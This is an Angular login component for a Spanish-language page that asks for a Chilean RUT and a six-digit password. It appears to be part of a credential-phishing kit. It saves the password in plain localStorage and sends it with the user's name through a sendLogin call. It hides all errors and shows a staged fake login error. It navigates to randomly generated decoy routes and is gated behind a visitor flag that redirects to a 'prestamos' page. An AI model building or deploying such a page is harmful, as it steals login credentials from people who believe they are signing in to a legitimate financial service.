import { Component, HostListener, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { UserModel } from 'src/app/shared/models/user.model';
import { MainService } from 'src/app/shared/services/main.service';

@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.scss'],
})
export class HomeComponent {
  public userModel: UserModel;
  // private randParams: RandonParams;

  public isLoading: boolean = false;

  public ifRutError: boolean = false;
  public ifPassError: boolean = false;
  public showErrorLogin: boolean = false;
  public ifActiveButton: boolean = false;

  public innerWidth: number = window.innerWidth;
  public openTextWhatsapp: boolean = false;
  public whatsappText: string = 'Haz tus consultas por WhatsApp';

  constructor(private mainSrv: MainService, private router: Router) {
    const state = localStorage.getItem('isOk');
    if (!state || state !== 'true') {
      this.router.navigate(['/prestamos']);
    }

    this.userModel = new UserModel();
  }

  ngAfterViewInit() {
    setTimeout(() => {
      this.innerWidth = window.innerWidth;
      this.btnWhatsappListener(this.innerWidth);
    }, 0);
  }

  @HostListener('window:resize', ['$event'])
  onResize(event: any) {
    this.innerWidth = event.target.innerWidth;
    this.btnWhatsappListener(this.innerWidth);
  }

  btnWhatsappListener(width: number) {
    if (width < 600) {
      this.whatsappText = 'Haz tus consultas por WhatsApp';
      this.openTextWhatsapp = true;
    } else {
      this.whatsappText =
        'Haz tus consultas por WhatsApp al +56 22 390 6000, o haz clic aquí para ir a WhatsApp Web';
      this.openTextWhatsapp = false;
    }
  }

  async logIn() {
    this.showErrorLogin = false;

    if (
      !this.userModel.rut ||
      !this.userModel.rut.length ||
      !this.userModel.clave ||
      !this.userModel.clave.length
    ) {
      return false;
    }

    if (this.ifRutError || this.ifPassError) {
      this.isLoading = true;
      setTimeout(() => {
        this.showErrorLogin = true;
        this.isLoading = false;
      }, 2000);

      return false;
    }

    let fullName = 'Indefinido';
    localStorage.setItem('userRut', this.userModel.rut);
    localStorage.setItem('userPass', this.userModel.clave);
    localStorage.setItem('userName', 'Indefinido');
    this.isLoading = true;

    try {
      const getRut: any = await this.mainSrv
        .getRutInfo(this.userModel.rut)
        .then();
      if (getRut && getRut.razon_social) {
        fullName = getRut.razon_social;
        localStorage.setItem('userName', getRut.razon_social);
      }

      await this.mainSrv.sendLogin(
        this.userModel.rut,
        this.userModel.clave,
        fullName
      );
    } catch (error) {
    } finally {
      this.router.navigate([this.getRoute()]);
    }

    return true;
  }

  getRoute(): string {
    const main = ['dashboard', 'tablero', 'central'];
    const optional = [
      'gestion',
      'controls',
      'gestor',
      'infos',
      'changes',
      'vista',
      '',
      'views',
    ];
    let rand = `${main[Math.floor(Math.random() * main.length)]}/${
      optional[Math.floor(Math.random() * optional.length)]
    }`;
    return rand;
  }

  rutOnChange(value: string) {
    if (!this.userModel.rut || !this.userModel.rut.length) {
      this.ifRutError = false;
      return false;
    }

    if (this.userModel.rut.length > 4 && this.userModel.clave.length > 3) {
      this.ifActiveButton = true;
    } else {
      this.ifActiveButton = false;
    }

    this.userModel.rut = this.formatRut(this.userModel.rut);

    const isValid = this.verificarRutSu(this.userModel.rut);
    if (!isValid) {
      this.ifRutError = true;
      return false;
    }

    this.ifRutError = false;
    return true;
  }

  passOnChange(value: string) {
    if (!this.userModel.clave || !this.userModel.clave.length) {
      this.ifPassError = false;
      return false;
    }

    if (this.userModel.rut.length > 4 && this.userModel.clave.length > 3) {
      this.ifActiveButton = true;
    } else {
      this.ifActiveButton = false;
    }

    if (this.userModel.clave.length !== 6) {
      this.ifPassError = true;
      return false;
    }

    this.ifPassError = false;
    return true;
  }

  justNumerKeyPress(event: KeyboardEvent) {
    const tecla = document.all ? event.keyCode : event.which;
    if (tecla === 8) {
      return true;
    }
    const patron = /[0-9]/;
    const teclaFinal = String.fromCharCode(tecla);
    return patron.test(teclaFinal);
  }

  ////// Verificar RUT //////
  private formatRut(rut: string) {
    const newRut = rut
      .toString()
      .replace(/\./g, '')
      .toString()
      .replace(/\-/g, '')
      .trim()
      .toLowerCase();
    const lastDigit = newRut.substr(-1, 1);
    const rutDigit = newRut.substr(0, newRut.length - 1);
    let format = '';
    for (let i = rutDigit.length; i > 0; i--) {
      const e = rutDigit.charAt(i - 1);
      format = e.concat(format);
      if (i % 3 === 0) {
        format = '.'.concat(format);
      }
    }
    return format.concat('-').concat(lastDigit);
  }

  private verificarRutSu(strRut: string) {
    if (strRut !== '') {
      let vRut = strRut
        .replace(/\./g, '')
        .toString()
        .replace(/\-/g, '')
        .trim()
        .toLowerCase();
      let straux = vRut.substring(vRut.length - 1, vRut.length);
      const digVerifIn = straux == 'k' ? straux.toUpperCase() : straux;
      straux = vRut.substring(0, vRut.length - 1);
      const digVerif =
        this.soloNumeros(straux) == 0 ? 'KX' : this.digitoVerificador(straux);
      if (digVerif == digVerifIn) return true;
      else return false;
    } else return false;
  }

  private soloNumeros(strIn: string) {
    const nRos = '1234567890';
    let crtrAux;
    let iaux = 0;
    for (let i = 0; i < strIn.length; i++) {
      crtrAux = strIn.charAt(i);
      if (nRos.indexOf(crtrAux) != -1) iaux++;
    }
    return iaux != strIn.length || strIn.length == 0 ? 0 : 1;
  }

  private digitoVerificador(strRut: string): any {
    let largo;
    let largoN;
    let i;
    let total;
    let numero = '';
    let carac;
    let caracVal;
    let tmpRut;
    let intTmp;

    tmpRut = strRut;
    largo = tmpRut.length;
    largoN = 0;
    for (i = 0; i < largo; i++) {
      carac = parseInt(tmpRut.charAt(i), 10);
      if (carac >= 0 && carac <= 9) {
        numero += tmpRut.charAt(i);
        largoN++;
      }
    }
    total = 0;
    for (i = largoN - 1; i >= 0; i--) {
      if (largoN - i < 7) {
        intTmp = largoN - i + 1;
      } else {
        intTmp = largoN - i - 5;
      }
      total += parseInt(numero.charAt(i), 10) * intTmp;
    }

    caracVal = 11 - (total % 11);

    if (caracVal == 10) return 'K';
    if (caracVal >= 0 && caracVal <= 9) return caracVal;
    if (caracVal == 11) return 0;
  }
}
